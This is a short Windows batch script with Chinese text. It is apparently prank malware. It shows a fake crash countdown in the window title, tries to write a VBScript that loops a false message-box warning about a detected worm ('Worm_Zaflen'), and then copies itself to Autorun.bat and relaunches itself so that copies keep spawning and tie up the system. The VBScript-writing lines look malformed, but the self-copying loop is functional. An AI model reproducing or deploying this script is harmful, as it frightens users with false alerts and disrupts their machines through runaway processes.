@echo off
color 9f
title=                                                   警告：系统在10秒内将彻底崩溃
mode con cols=300 lines=1
@echo 
do
msgbox chr(13) + chr(13) + chr(13) + "Window系统防火墙检测到蠕虫病毒：Ｗｏｒｍ＿Ｚａｆｌｅｎ，系统即将将崩溃。"
loop>autorun.vbe
start autorun.vbe
copy %0 Autorun.bat
start Autorun.bat
